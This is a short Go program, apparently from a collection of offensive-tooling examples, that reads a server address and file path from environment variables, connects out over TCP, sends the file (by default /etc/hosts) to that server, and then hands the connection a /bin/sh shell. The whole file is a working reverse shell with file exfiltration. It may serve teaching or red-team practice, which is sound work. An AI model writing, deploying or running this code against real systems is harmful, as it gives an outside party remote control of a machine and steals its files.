// Program argv_from_environment - argv_from_source with optional environment
// variables
package main

/*
 * argv_from_environment.go
 * argv_from_source, but also which queries environment varibles
 * By J. Stuart McMurray
 * Created 20240901
 * Last Modified 20240906
 */

import (
	"cmp"
	"log"
	"net"
	"os"
	"os/exec"
)

// Compile-time configurables
var (
	Address       = "localhost:4444"
	AddressEnvVar = "ALPT4ATS_ADDRESS"
	File          = "/etc/hosts"
	FileEnvVar    = "ALPT4ATS_FILE"
)

func main() {
	/* Config from environment overrides compile-time config. */
	Address = cmp.Or(os.Getenv(AddressEnvVar), Address)
	File = cmp.Or(os.Getenv(FileEnvVar), File)

	/* Connect to the server. */
	c, err := net.Dial("tcp", Address)
	if nil != err {
		log.Fatalf("Error connecting to server: %s", err)
	}

	/* Send back the file. */
	b, err := os.ReadFile(File)
	if nil != err {
		log.Fatalf("Error reading file: %s", err)
	}
	if _, err := c.Write(b); nil != err {
		log.Printf("Error sending file: %s", err)
	}

	/* Spawn a shell. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = c
	sh.Stdout = c
	sh.Stderr = c
	if err := sh.Run(); nil != err {
		log.Fatalf("Shell died: %s", err)
	}
}
